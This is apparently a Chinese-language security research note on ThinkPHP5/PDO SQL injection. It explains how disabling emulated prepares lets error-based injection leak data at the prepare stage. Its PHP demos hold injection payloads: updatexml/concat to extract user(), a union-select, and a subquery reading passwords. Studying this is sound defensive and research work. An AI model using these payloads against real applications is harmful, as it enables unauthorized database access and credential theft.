参考：
- https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html
- https://xz.aliyun.com/t/2812#toc-1


PDO预编译执行过程分为三步：
1. prepare($SQL) 编译SQL语句
2. bindValue($param, $value) 将value绑定到param的位置上
3. execute() 执行SQL语句

在PDO三步骤中，如果设置了`PDO::ATTR_EMULATE_PREPARES  => false`，可以在第一步prepare编译SQL语句时获取数据库信息。见如下demo:
```php
<?php
$params = [
    PDO::ATTR_ERRMODE           => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_EMULATE_PREPARES  => false,
];

$db = new PDO('mysql:dbname=cat;host=127.0.0.1;', 'root', 'root', $params);

try {
    $link = $db->prepare('SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))');
} catch (\PDOException $e) {
    var_dump($e);
}
```
这里会报错出`root@localhost`。  

Phith0n师傅的解释：
> 究其原因，是因为我这里设置了PDO::ATTR_EMULATE_PREPARES => false。  
> 这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行；如果我这里设置了PDO::ATTR_EMULATE_PREPARES => false，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。  
> 非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing->resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization->execution）。


### 关于不能执行子查询的原因探究

**第一种情况**  
在执行第二部$param的绑定时，如果变量是一个SQL语句(如下demo)
```sql
<?php
$params = [
    PDO::ATTR_ERRMODE           => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_EMULATE_PREPARES  => false,
];

$db = new PDO('mysql:dbname=tp5015;host=127.0.0.1;', 'root', '1234', $params);

try {
    $link = $db->prepare('SELECT * FROM user WHERE  id IN (:where_id_in_0)union(select~1,2)');
    var_dump($link);
    $link->bindValue(':where_id_in_0)union(select~1,2)','1','1');
} catch (\PDOException $e) {
    var_dump($e);
}
```
会报错  
`SQLSTATE[HY093]: Invalid parameter number: parameter was not defined`。
在上面的demo中在绑定的变量中，我已经经历让:符号后面的字符串中不出现空格。但是在PDO的prepare编译sql语句这个过程中，pdo已经把(:)内的内容认为时PDO绑定的变量，所以在第二步bindValue步骤中，才会报错`parameter was not defined`
  

**第二种情况**
```php
<?php
$params = [
    PDO::ATTR_ERRMODE           => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_EMULATE_PREPARES  => false,
];

$db = new PDO('mysql:dbname=tp5009;host=127.0.0.1;', 'root', '1234', $params);

try {
   $link = $db->prepare('SELECT * FROM `user` WHERE  `id` IN (:where_id_in_0,updatexml(0,concat(0xa,(select password from user limit 1)),0)) ');
    var_dump($link);
} catch (\PDOException $e) {
    var_dump($e);
}
```
报错：  
`"SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported"`  
原因可能时不接触数据，phith0n的猜测：  
> 预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的 ，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来。